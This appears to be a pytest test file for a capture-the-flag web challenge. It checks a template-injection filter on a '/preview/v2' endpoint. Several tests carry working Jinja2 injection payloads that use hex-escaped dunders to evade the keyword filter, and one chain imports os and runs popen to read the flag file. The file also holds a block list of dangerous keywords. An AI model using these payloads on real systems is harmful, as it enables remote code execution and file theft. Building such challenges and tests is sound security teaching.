def test_waf_bypass_hex_dunders(logged_in_client):
    """Hex-encoded dunders should bypass WAF."""
    payload = "{{self|attr('\\x5f\\x5finit\\x5f\\x5f')}}"
    resp = logged_in_client.post('/preview/v2', data={'body': payload})
    assert resp.status_code == 200
    assert b'Blocked' not in resp.data


def test_waf_bypass_globals(logged_in_client):
    """Should be able to access globals via hex bypass."""
    payload = "{{self|attr('\\x5f\\x5finit\\x5f\\x5f')|attr('\\x5f\\x5fglobals\\x5f\\x5f')}}"
    resp = logged_in_client.post('/preview/v2', data={'body': payload})
    assert resp.status_code == 200
    assert b'Blocked' not in resp.data


def test_waf_blocks_each_keyword(logged_in_client):
    """Each blocked keyword should be caught."""
    blocked = ['__', 'config', 'os', 'class', 'subclasses', 'request',
               'import', 'popen', 'system', 'eval', 'exec', 'builtins']
    for word in blocked:
        resp = logged_in_client.post('/preview/v2', data={'body': word})
        assert resp.status_code == 400, f"WAF should block '{word}'"


def test_rce_payload(logged_in_client, app):
    """Full RCE payload should work on v2."""
    import os
    secret_dir = os.path.join(app.root_path, '..', 'secret')
    flag_path = os.path.join(secret_dir, 'flag.txt')
    # Use the actual flag file path (differs between local and Docker)
    payload = (
        "{{lipsum|attr('\\x5f\\x5fglobals\\x5f\\x5f')"
        "|attr('\\x5f\\x5fgetitem\\x5f\\x5f')('\\x5f\\x5f\\x62uiltins\\x5f\\x5f')"
        "|attr('\\x5f\\x5fgetitem\\x5f\\x5f')('\\x5f\\x5f\\x69mport\\x5f\\x5f')('\\x6f\\x73')"
        f"|attr('p\\x6fpen')('cat {flag_path}')"
        "|attr('read')()}}"
    )
    resp = logged_in_client.post('/preview/v2', data={'body': payload})
    assert resp.status_code == 200
    assert b'durham-cms-flag4{' in resp.data
